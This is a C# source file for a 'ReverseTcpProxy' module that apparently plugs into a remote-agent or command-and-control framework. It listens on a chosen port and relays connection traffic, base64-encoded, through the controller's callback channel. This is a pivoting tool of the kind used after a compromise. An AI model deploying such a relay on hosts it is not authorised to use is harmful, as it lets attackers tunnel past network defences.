﻿using System.Linq;
using System;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Threading;
using System.Collections.Generic;
using System.IO;
using System.Net;

namespace ReverseTcpProxy
{
    public class Program
    {

        public static int Main()
        {
            Console.WriteLine("Module needs to be streamed");
            return 0;
        }

        public static void Stream(Func<object, Task> cb, string[] args, Queue<Dictionary<string, string>> queue, int jobId)
        {
            
            var targetPort = int.Parse(args[0]);

            List<Job> jobs = new List<Job>();
            cb(new
            {
                returnType = 10,
                output = new
                {
                    port = targetPort,
                    jobId = jobId
                }
            });

            TcpListener server = new TcpListener(IPAddress.Any, targetPort);
            server.Start();

            try
            {
                while (true)
                {
                    if (server.Pending())
                    {
                        var newJob = new Job
                        {
                            Id = Guid.NewGuid().ToString(),
                            Client = server.AcceptTcpClient(),
                        };
                        newJob.Thread = new Thread(() => OpenConnection(cb, targetPort, newJob));
                        newJob.Thread.Start();
                        jobs.Add(newJob);
                    }

                    if (queue.Any())
                    {
                        var message = queue.Dequeue();
                        var connectionId = message["connection_id"];

                        var job = jobs.FirstOrDefault(j => j.Id == connectionId);
                        if (job != null)
                        {
                            if (message.ContainsKey("data"))
                            {
                                var bytes = Convert.FromBase64String(message["data"]);
                                job.Stream.Write(bytes, 0, bytes.Length);
                            }
                            else
                            {
                                job.Thread.Abort();
                                jobs.Remove(job);
                            }
                        }
                    }

                    Thread.Sleep(100);
                }
            }
            finally
            {
                jobs.ForEach(j => j.Thread.Abort());
                server.Stop();
            }
        }

        private static void OpenConnection(Func<object, Task> cb, int targetPort, Job job)
        {
            try
            {
                Stream networkStream = job.Client.GetStream();

                job.Stream = networkStream;

                var targetBuffer = new byte[65536];

                while (job.Client.Connected)
                {
                    var count = networkStream.Read(targetBuffer, 0, targetBuffer.Length);
                    if (count > 0)
                    {
                        cb(new
                        {
                            returnType = 9,
                            output = new
                            {
                                data = Convert.ToBase64String(targetBuffer.Take(count).ToArray()),
                                port = targetPort,
                                connectionId = job.Id,
                            }
                        });
                    }

                    Thread.Sleep(100);
                }
            }
            finally
            {
                job.Client.Close();
                job.Client.Dispose();
            }
        }

        public class Job
        {
            public string Id;
            public Thread Thread;
            public Stream Stream;
            public TcpClient Client;
        }

    }
}